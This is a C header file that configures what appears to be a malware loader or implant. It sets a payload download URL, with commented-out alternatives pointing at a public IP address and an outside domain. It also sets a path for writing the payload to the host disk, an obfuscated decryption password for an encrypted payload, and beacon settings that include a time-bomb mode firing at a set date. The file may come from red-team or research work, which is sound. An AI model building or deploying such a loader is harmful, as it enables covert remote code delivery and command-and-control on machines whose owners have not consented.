#ifndef PREFERENCES_H
#define PREFERENCES_H

//---------------------------------------------------------------
// EDIT PAYLOAD SETTINGS HERE

#define PAYLOAD_URL "https://127.0.0.1:25566/api/testloader?send=" //"https://fruit.qc.to:25566/api/testloader?send=payload-6" // URL to download the payload from
                    // "https://71.163.46.151:25566/api/testloader?send=payload-6&uid="
#define PATH_TO_WRITE "../test_files/demo_file" // path to write payload to on host disk (if not executable)
#define ENC_PASSWORD "\xea\xf7\xee\xe2\xff\xe3\xea\xd0\xff\xee\xfc\xfc\xf8\xe0\xfd\xeb" // symmetric password for decryption generated by passgen.py
#define BEACON_MODE_INITIAL 0 // same beaconing logic as below, but for initial beacon to get instructions
#define BEACON_DATE_TIME_INITIAL 0 // same as below, but for time bomb initial beacon for intstructions
#define BEACON_MODE 1 // 0 for instantly beacon once, any positive number x for beacon every x seconds, -1 to beacon at date/time
#define BEACON_DATE_TIME 1617309000 // Unix epoch value for when to beacon (EX 1617309000 beacons Thu, 01 Apr 2021 16:30:00 EST)
                           // Note: BEACON_DATE_TIME only applies when BEACON_MODE is set to -1

//----------------------------------------------------------------

#endif